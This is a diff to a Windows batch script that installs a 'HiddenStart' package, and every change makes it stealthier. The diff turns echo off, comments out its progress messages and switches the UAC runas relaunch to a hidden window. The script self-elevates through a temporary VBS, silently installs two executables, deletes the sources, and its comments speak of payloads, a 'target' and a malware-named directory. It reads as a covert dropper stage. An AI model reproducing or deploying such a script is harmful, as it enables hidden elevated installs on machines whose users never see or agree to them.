@@ -1,4 +1,4 @@
-@echo on
+@echo off
 rem *******************************************************
 rem HiddenStartInstall_00.cmd
 rem This Script will Install a HiddenStart Packet,
@@ -42,7 +42,7 @@ rem
 set HIDSTARTEXE001=HiddenStartSetupRePack.exe
 set HIDSTARTEXE002=Hstart_5.1-setup.exe
 
-echo Make %UTIL% Directory if not Exist
+rem echo Make %UTIL% Directory if not Exist
 rem
 if not exist %UTIL% md %UTIL%
 
@@ -72,7 +72,7 @@ rem
 set getadminvbs=nit-%~n0.vbs
     echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
     set params = %*:"="
-    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%TPDL%\%getadminvbs%"
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 0 >> "%TPDL%\%getadminvbs%"
 
     %wscriptexe% "%TPDL%\%getadminvbs%"
     del "%TPDL%\%getadminvbs%"
@@ -84,11 +84,11 @@ echo Run as Admin...
 rem Download and Execute Payloads
 rem
 
-echo Run Payloads...
+rem echo Run Payloads...
 
 set FROMDIR=%BINEXEDIR%
 
-echo Delete Files from Target
+rem echo Delete Files from Target
 
 set TODIR=%ZLOVREDDIR%
 
@@ -100,21 +100,21 @@ set TODIR=%UTIL%
 if exist %TODIR%\%HIDSTARTEXE001% del /Q /F %TODIR%\%HIDSTARTEXE001%
 if exist %TODIR%\%HIDSTARTEXE002% del /Q /F %TODIR%\%HIDSTARTEXE002%
 
-echo Check Integrity...
+rem echo Check Integrity...
 rem
 
 if not exist %FROMDIR%\%HIDSTARTEXE001% echo %FROMDIR%\%HIDSTARTEXE001% is not Found && exit /b 1
 if not exist %FROMDIR%\%HIDSTARTEXE002% echo %FROMDIR%\%HIDSTARTEXE002% is not Found && exit /b 1
 
-echo Install a Hidden Start...
+rem echo Install a Hidden Start...
 
 %FROMDIR%\%HIDSTARTEXE001% /VERYSILENT /NOCANCEL
 %FROMDIR%\%HIDSTARTEXE002% /S
 
-echo Remove Source...
+rem echo Remove Source...
 
 Del /Q /F %FROMDIR%\%HIDSTARTEXE001%
 Del /Q /F %FROMDIR%\%HIDSTARTEXE002%
 
-echo The End of the Script %0
+rem echo The End of the Script %0
 exit /b 0
